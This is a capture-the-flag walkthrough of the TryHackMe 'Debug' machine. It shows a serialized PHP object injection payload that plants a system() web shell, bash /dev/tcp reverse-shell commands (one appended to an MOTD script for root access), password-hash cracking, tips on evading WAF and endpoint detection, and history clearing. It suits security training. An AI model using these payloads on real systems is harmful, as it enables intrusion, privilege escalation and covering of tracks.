# Try Hack Me — Debug Walkthrough

---

## Author

**PulseEinher**

---

## Introduction

**Hello, stranger — let’s begin.**

![Ready to go??](./images/debug_1.webp)

---

## Challenge Link

Today’s problem is: https://tryhackme.com/room/debug

---

## Challenge Overview

**Machine:** Debug (THM)

**Path:** Port Scan → Web Enumeration → Backup File Disclosure → PHP Object Injection → Web Shell → Reverse Shell → Credential Extraction (.htpasswd) → SSH Access → MOTD Privilege Escalation → Root

**Key Takeaway:**  
Exposure of backup source code combined with unsafe deserialization enabled remote code execution, which was further leveraged to gain credentials and escalate privileges through misconfigured system scripts.

**Business Impact:**  
In a real-world web application environment, exposing backup files and insecure debugging functionality could allow attackers to gain backend access and plant persistent web shells. This could lead to unauthorized access to user accounts, leakage of stored credentials, and full server takeover. From a business perspective, this may result in customer data exposure, service disruption, and long-term reputational damage — especially if attackers maintain persistence through mechanisms like login-triggered scripts.

---

## Initial Setup

The following entry was added to the `/etc/hosts` file to simplify hostname-based interaction with the target system:

    <TARGET_IP> debug.thm

---

## Port Scanning

The initial enumeration phase was started by performing a full port scan against the target machine using Nmap. The following commands were executed to identify open ports and active services:

    nmap -p- --open debug.thm
    nmap -sC -sV -p <OPEN_PORTS> debug.thm

    ┌──(root㉿vbox)-[~]
    └─# nmap -p- --open debug.thm
    Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-27 00:55 +0530
    Nmap scan report for debug.thm (10.48.144.196)
    Host is up (0.094s latency).
    Not shown: 65533 closed tcp ports (reset)
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http

    Nmap done: 1 IP address (1 host up) scanned in 103.00 seconds

    ┌──(root㉿vbox)-[~]
    └─# nmap -sC -sV -p 22,80 debug.thm
    Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-27 00:58 +0530
    Nmap scan report for debug.thm (10.48.144.196)
    Host is up (0.046s latency).

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   2048 44:ee:1e:ba:07:2a:54:69:ff:11:e3:49:d7:db:a9:01 (RSA)
    |   256 8b:2a:8f:d8:40:95:33:d5:fa:7a:40:6a:7f:29:e4:03 (ECDSA)
    |_  256 65:59:e4:40:2a:c2:d7:05:77:b3:af:60:da:cd:fc:67 (ED25519)
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-title: Apache2 Ubuntu Default Page: It works
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 9.55 seconds

---

## Services Identified

    22 -> SSH
    80 -> HTTP

As no login credentials were present, further enumeration focused on publicly accessible services, i.e., HTTP.

---

## Directory Enumeration

A directory enumeration scan was also performed against the HTTP service using Gobuster to identify any further hidden or restricted endpoints on the HTTP service.

    ┌──(root㉿vbox)-[~]
    └─# gobuster dir -u http://debug.thm  -w /usr/share/seclists/Discovery/Web-Content/big.txt
    ===============================================================
    Gobuster v3.8.2
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://debug.thm
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.8.2
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    .htaccess            (Status: 403) [Size: 274]
    .htpasswd            (Status: 403) [Size: 274]
    backup               (Status: 301) [Size: 307] [--> http://debug.thm/backup/]
    grid                 (Status: 301) [Size: 305] [--> http://debug.thm/grid/]
    javascript           (Status: 301) [Size: 311] [--> http://debug.thm/javascript/]
    javascripts          (Status: 301) [Size: 312] [--> http://debug.thm/javascripts/]
    readme.md            (Status: 200) [Size: 2339]
    server-status        (Status: 403) [Size: 274]
    Progress: 20481 / 20481 (100.00%)
    ===============================================================
    Finished
    ===============================================================

The `/backup` directory was found to contain backend files, which are typically not intended to be publicly accessible and may expose sensitive application logic.

---

## Vulnerability — PHP Object Injection

Upon exploring further, the code of `index.php.bak` revealed that user-controlled input from the debug GET parameter is passed directly into the `unserialize()` function without any validation:

    // Leaving this for now... only for debug purposes... do not touch!

    $debug = $_GET['debug'] ?? '';
    $messageDebug = unserialize($debug);

    $application = new FormSubmit;
    $application -> SaveMessage();

### MITRE ATT&CK

- T1595 — Active Scanning  
- T1046 — Network Service Discovery  
- T1083 — File and Directory Discovery  

This introduces a PHP Object Injection vulnerability, as untrusted serialized data is being deserialized without sanitization.

Since the FormSubmit class contains a `__destruct()` method that writes data to a file, this behavior can be abused to perform arbitrary file writes, ultimately enabling remote code execution by writing a malicious PHP file to the web directory.

---

## Exploitation

A serialized payload was crafted to exploit this behavior:

    O:10:"FormSubmit":2:{s:9:"form_file";s:9:"shell.php";s:7:"message";s:30:"<?php system($_GET['cmd']); ?>";}

    O:10 → class name length = 10 (FormSubmit)
    s:9:"shell.php" → length MUST match exactly
    s:30:"<?php system($_GET['cmd']); ?>" → count characters properly

The structure of the payload must strictly match the expected format, including correct string lengths, as incorrect lengths would result in deserialization failure.

> Note -> Direct PHP object injection using clearly structured serialized payloads is often detected by modern web application firewalls and input validation mechanisms. In real-world environments, payloads are typically obfuscated, fragmented, or encoded to bypass pattern-based detection and avoid triggering security filters.

---

## Payload Delivery

The payload was then URL-encoded to ensure safe transmission through HTTP parameters. The encoded payload is:

    O%3A10%3A%22FormSubmit%22%3A2%3A%7Bs%3A9%3A%22form_file%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A7%3A%22message%22%3Bs%3A30%3A%22%3C%3Fphp+system(%24_GET%5B%27cmd%27%5D);+%3F%3E%22%3B%7D

The following request was used to deliver the payload:

    curl "http://debug.thm/index.php?debug=O%3A10%3A%22FormSubmit%22%3A2%3A%7Bs%3A9%3A%22form_file%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A7%3A%22message%22%3Bs%3A30%3A%22%3C%3Fphp+system(%24_GET%5B%27cmd%27%5D);+%3F%3E%22%3B%7D"

The response indicated that the submission was successfully saved, confirming that the payload was processed, resulting in the creation of a web-accessible shell.

> Note -> Simple web shells using functions like system() are widely recognized by endpoint protection and file integrity monitoring systems. In real-world environments, attackers often use obfuscated or fileless execution techniques to reduce detection and avoid leaving obvious artifacts on disk.

---

## Remote Code Execution

The presence of remote code execution was verified using:

    ┌──(root㉿vbox)-[~/Desktop/debug]
    └─# curl http://debug.thm/shell.php?cmd=id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)

Alternatively, tools such as BurpSuite could have been used for request manipulation; however, direct command-line interaction was sufficient in this scenario.

---

## Reverse Shell

A reverse shell payload was then injected to obtain interactive access to the system.

A Netcat listener was started on the attacker machine, and the reverse shell was triggered using:

    curl "http://debug.thm/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<ATTACKER_IP>%2F4444%200%3E%261%22"

The reverse shell can be stabilised using the following commands:

    python3 -c 'import pty; pty.spawn("/bin/bash")'
    Ctrl+Z
    stty raw -echo
    fg
    <Press ENTER>
    export TERM=xterm
    export SHELL=/bin/bash
    stty rows 40 columns 120

    ┌──(root㉿vbox)-[~]
    └─# nc -lvnp 4444
    listening on [any] 4444 ...
    connect to [192.168.149.224] from (UNKNOWN) [10.48.154.72] 53626
    bash: cannot set terminal process group (1046): Inappropriate ioctl for device
    bash: no job control in this shell
    www-data@osboxes:/var/www/html$ python3 -c 'import pty; pty.spawn("/bin/bash")'
    www-data@osboxes:/var/www/html$ whoami
    www-data

---

## MITRE ATT&CK

- T1190 — Exploit Public-Facing Application  
- T1059 — Command and Scripting Interpreter  
- T1105 — Ingress Tool Transfer  

---

## Credential Extraction

The current directory `/var/www/html` contained a `.htpasswd` file, which stored hashed credentials for user `james`.

The hash was saved in a `.txt` file and decrypted using the John the Ripper tool.

    ┌──(root㉿vbox)-[~/Desktop/debug]
    └─# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=md5crypt-long

    ┌──(root㉿vbox)-[~/Desktop/debug]
    └─# john --show hash.txt --format=md5crypt-long
    james:{REDACTED}

---

## SSH Access

The SSH service was then accessed using these login credentials.

    ┌──(root㉿vbox)-[~/Desktop/debug]
    └─# ssh james@debug.thm

    james@osboxes:~$ whoami
    james

---

## User Flag

The user flag was captured from the `/home/james` directory:

    james@osboxes:~$ cd /home/james/
    james@osboxes:~$ cat user.txt
    <<USER_FLAG>>

---

## Privilege Escalation — MOTD Abuse

A message within the `/home/james` directory indicated that the user had been granted permissions related to SSH configuration files.

The directory `/etc/update-motd.d/` was enumerated:

    james@osboxes:~$ ls -la /etc/update-motd.d/

It was observed that multiple files within this directory were writable by the user `james`.

These scripts are executed automatically during SSH login and run with root privileges, and this behavior can be abused by modifying any writable script to include a malicious payload.

> Note -> Direct modification of MOTD scripts for privilege escalation is uncommon in hardened environments, as such directories are typically restricted or monitored.

A reverse shell payload was appended:

    echo 'bash -c "bash -i >& /dev/tcp/192.168.149.224/4444 0>&1"' >> /etc/update-motd.d/00-header

A Netcat listener was started on the attacker machine, and the reverse shell was triggered by logging out and reconnecting via SSH.

---

## Root Access

The shell was stabilised using previously described methods.

    root@osboxes:/# whoami
    root

The root flag can be obtained from the `/root` directory:

    root@osboxes:/root# cat root.txt
    <<<ROOT_FLAG>>> !!!

---

## MITRE ATT&CK

- T1552 — Unsecured Credentials  
- T1078 — Valid Accounts  
- T1548 — Abuse Elevation Control Mechanism  

---

## Cleanup

1. The web shell (`shell.php`) created in `/var/www/html` via PHP object injection should be deleted.  
2. Reverse shell connections should be terminated.  
3. The modified MOTD script should be restored.  
4. Shell history files should be cleared.  

---

## Remediations

1. Avoid using `unserialize()` on user-controlled input.  
2. Remove publicly accessible backup files.  
3. Secure credential storage and restrict `.htpasswd` exposure.  
4. Restrict write permissions on sensitive directories.  
5. Disable execution permissions in web directories.  

---

## Conclusion

We are done with the machine……….

Let’s move to the next, till then  
Have a good day (night too)

---

## Disclaimer

This content is intended for educational purposes only.
